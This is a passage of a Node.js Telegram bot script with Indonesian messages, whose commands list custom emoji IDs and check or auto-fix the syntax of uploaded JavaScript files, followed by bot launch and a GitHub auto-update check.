    ctx.reply('🔓 Group Only dimatikan')
  } else {
    ctx.reply('Gunakan: /grouponly on / off')
  }
})

bot.command('cekemoji', async (ctx) => {
  const reply = ctx.message.reply_to_message;

  if (!reply) {
    return ctx.reply(`
❌ Reply pesan yang berisi emoji premium.

Contoh:
- User kirim emoji premium
- Reply emoji tersebut dengan command /cekemoji
    `);
  }

  const emojis = [];

  if (reply.entities) {
    reply.entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({
          id: entity.custom_emoji_id
        });
      }
    });
  }

  if (reply.caption_entities) {
    reply.caption_entities.forEach((entity) => {
      if (entity.type === "custom_emoji") {
        emojis.push({
          id: entity.custom_emoji_id
        });
      }
    });
  }

  if (emojis.length === 0) {
    return ctx.reply(`
❌ Tidak ada custom emoji terdeteksi.

Gunakan command ini dengan reply ke pesan yang berisi emoji premium Telegram.
    `);
  }

  let result = `
<b>╔════════════════════╗
   CUSTOM EMOJI FOUND
╚════════════════════╝</b>
`;

  emojis.forEach((e, i) => {
    result += `

<b>-> Emoji ${i + 1}</b>
<code>${e.id}</code>

<b>Format Pakai:</b>
<code>&lt;tg-emoji emoji-id="${e.id}"&gt;✨&lt;/tg-emoji&gt;</code>
`;
  });

  result += `

<b>━━━━━━━━━━━━━━━━━━━━</b>
<b>Total Emoji:</b> ${emojis.length}
`;

  await ctx.reply(result, {
    parse_mode: "HTML"
  });
});

bot.command("CheckError", async (ctx) => {
  try {
    const msg = ctx.message.reply_to_message;

    if (!msg || !msg.document) {
      return ctx.reply("❌ Reply file JavaScript (.js)");
    }

    const doc = msg.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus format .js");
    }

    const fileLink = await ctx.telegram.getFileLink(doc.file_id);

    const tempPath = path.join(__dirname, `check_${Date.now()}.js`);

    // download file
    const res = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

    fs.writeFileSync(tempPath, res.data);

    const code = fs.readFileSync(tempPath, "utf8");

    let output;

    try {
      new Function(code);
      output = "✅ <b>Tidak ditemukan syntax error</b>";
    } catch (err) {
      output = `
❌ <b>Error ditemukan</b>

<pre>${err.message}</pre>
      `;
    }

    await ctx.reply(
      `<b>📦 HASIL CHECK ERROR</b>\n\n${output}`,
      { parse_mode: "HTML" }
    );

    fs.unlinkSync(tempPath);

  } catch (err) {
    console.log("CHECK ERROR:", err.message);
    ctx.reply("❌ Terjadi error saat proses.");
  }
});

bot.command("fixerror", async (ctx) => {
  try {
    const msg = ctx.message.reply_to_message;

    if (!msg || !msg.document) {
      return ctx.reply("❌ Reply file .js");
    }

    const doc = msg.document;

    if (!doc.file_name.endsWith(".js")) {
      return ctx.reply("❌ File harus JavaScript (.js)");
    }

    const fileLink = await ctx.telegram.getFileLink(doc.file_id);
    const tempPath = path.join(__dirname, `fix_${Date.now()}.js`);

    const res = await axios.get(fileLink.href, {
      responseType: "arraybuffer"
    });

    fs.writeFileSync(tempPath, res.data);

    let code = fs.readFileSync(tempPath, "utf8");

    let errorBefore = null;

    try {
      new Function(code);
    } catch (err) {
      errorBefore = err.message;
    }

    const fixedCode = autoFixJS(code);

    let errorAfter = null;

    try {
      new Function(fixedCode);
    } catch (err) {
      errorAfter = err.message;
    }

    const fixedPath = path.join(__dirname, `fixed_${Date.now()}.js`);
    fs.writeFileSync(fixedPath, fixedCode);

    let result = `<b>📦 FIX ERROR RESULT</b>\n\n`;

    if (!errorBefore) {
      result += "✅ Tidak ada error dari awal.";
    } else {
      result += `❌ Error sebelum:\n<pre>${errorBefore}</pre>\n\n`;

      if (!errorAfter) {
        result += "✅ Berhasil diperbaiki!";
      } else {
        result += `⚠️ Masih ada error:\n<pre>${errorAfter}</pre>`;
      }
    }

    await ctx.reply(result, { parse_mode: "HTML" });

    await ctx.replyWithDocument({
      source: fixedPath,
      filename: "fixed.js"
    });

    fs.unlinkSync(tempPath);

  } catch (err) {
    console.log("FIX ERROR:", err.message);
    ctx.reply("❌ Gagal proses.");
  }
});

// ---- ( akhir of menu ) ---- //
bot.launch();

// ------ ( Notif Konfirmasi Kalau Baru Aja Restart Karena Auto-Update ) ------ //
notifyIfJustUpdated();

// ------ ( Jalanin Auto-Update Check : setiap restart/ganti panel + realtime ) ------ //
(async () => {
  if (MODE === "production") {
    console.log(chalk.cyan("🔄 ☇ Mode production aktif, cek update ke GitHub..."));
    await checkAndApplyUpdate({ silent: false });
    setInterval(() => checkAndApplyUpdate(), UPDATE_CHECK_INTERVAL_MS);
  } else {
    console.log(chalk.yellow("🛠️ ☇ Mode developer aktif, auto-update dinonaktifkan."));
  }
})();
